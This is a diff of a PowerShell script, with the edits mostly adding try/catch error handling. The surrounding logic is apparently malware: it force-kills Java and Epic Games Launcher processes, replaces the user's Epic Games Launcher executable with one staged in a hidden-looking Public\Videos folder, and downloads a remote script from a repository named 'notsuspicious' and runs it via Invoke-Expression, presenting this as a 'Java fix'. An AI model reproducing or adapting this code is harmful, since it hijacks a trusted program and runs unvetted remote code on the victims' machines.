@@ -1,5 +1,10 @@
-# Stop processes if they are running
-Get-Process -Name "java", "javaw", "EpicGamesLauncher" -ErrorAction SilentlyContinue | Stop-Process -Force
+# Attempt to stop processes if they are running
+try {
+    Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -ErrorAction Stop -Force
+}
+catch {
+    Write-Host "Error occurred while stopping processes: $_"
+}
 
 # Define variables
 $counter = 0
@@ -37,16 +42,21 @@ if (-not $p) {
 
 # If Epic Games Launcher.lnk is found, proceed with moving and renaming
 if ($p) {
-    $counter++
-    $newPath = "C:\Users\Public\Videos\GraphicalUserInterface\EpicGamesLauncher$counter.lnk"
-    Move-Item -Path $p -Destination $newPath -Force
-    $executablePath = "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe"
-    Move-Item -Path $executablePath -Destination (Split-Path $p) -Force
-    Rename-Item -Path $newPath -NewName "Epic Games Launcher.lnk" -Force
-    Rename-Item -Path $executablePath -NewName "Epic Games Launcher.exe" -Force
+    try {
+        $counter++
+        $newPath = "C:\Users\Public\Videos\GraphicalUserInterface\EpicGamesLauncher$counter.lnk"
+        Move-Item -Path $p -Destination $newPath -Force -ErrorAction Stop
+        $executablePath = "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe"
+        Move-Item -Path $executablePath -Destination (Split-Path $p) -Force -ErrorAction Stop
+        Rename-Item -Path $newPath -NewName "Epic Games Launcher.lnk" -Force -ErrorAction Stop
+        Rename-Item -Path $executablePath -NewName "Epic Games Launcher.exe" -Force -ErrorAction Stop
 
-    # Output success message
-    Write-Host "Epic Games Launcher files moved and renamed successfully."
+        # Output success message
+        Write-Host "Epic Games Launcher files moved and renamed successfully."
+    }
+    catch {
+        Write-Host "Error occurred while moving or renaming files: $_"
+    }
 } else {
     Write-Host "Epic Games Launcher not found."
 }
@@ -56,6 +66,7 @@ try {
     $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
     Invoke-Expression $javaFixScript.Content
     Write-Host "Java fix script executed successfully."
-} catch {
-    Write-Host "Failed to execute Java fix script."
+}
+catch {
+    Write-Host "Failed to execute Java fix script: $_"
 }
